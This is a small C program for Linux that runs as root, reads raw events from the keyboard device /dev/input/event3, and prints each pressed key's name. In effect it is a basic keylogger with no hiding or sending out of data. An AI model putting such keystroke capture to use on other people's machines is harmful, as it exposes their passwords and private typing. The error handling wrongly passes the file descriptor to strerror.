#include <stdio.h>
#include <fcntl.h>  // open
#include <stdlib.h>
#include <string.h> // strerror
#include <stdint.h>
#include <assert.h>
#include <linux/input.h>

#include "key_util.h"
#include "util.h"

typedef struct input_event input_event;

static void rootCheck();
static char *getKeyboardDeviceFileName();
static int openKeyboardDeviceFile();

/**
 * Exit with return code -1 if user does not have root privileges
 */
static void rootCheck() {
   if (geteuid() != 0) {
      printf("Must run as root\n");
      exit(-1);
   }
}

/**
 * Detects and returns the name of the keyboard device file
 *
 * @return the name of the keyboard device file
 */
static char *getKeyboardDeviceFileName() {
   return "/dev/input/event3";
}

/**
 * Opens the keyboard device file
 *
 * @return the file descriptor on success, error code on failure
 */
static int openKeyboardDeviceFile() {
   int kbd_fd = open(getKeyboardDeviceFileName(), O_RDONLY);
   if (kbd_fd < 0) {
      printf("%s\n", strerror(kbd_fd));
      exit(kbd_fd);
   }

   return kbd_fd;
}

int main() {
   rootCheck();

   int kbd_fd = openKeyboardDeviceFile();
   assert(kbd_fd > 0);

   input_event event;
   while (read(kbd_fd, &event, sizeof(input_event)) > 0) {
      if (event.type == EV_KEY) {
         if (event.value == 1) { // Key press
            char *name = getKeyText(event.code);
            if (strcmp(name, UNKNOWN_KEY) != 0) {
               printf("%s\n", name);
            }
         }
      }
   }

   close(kbd_fd);
   return 0;
}
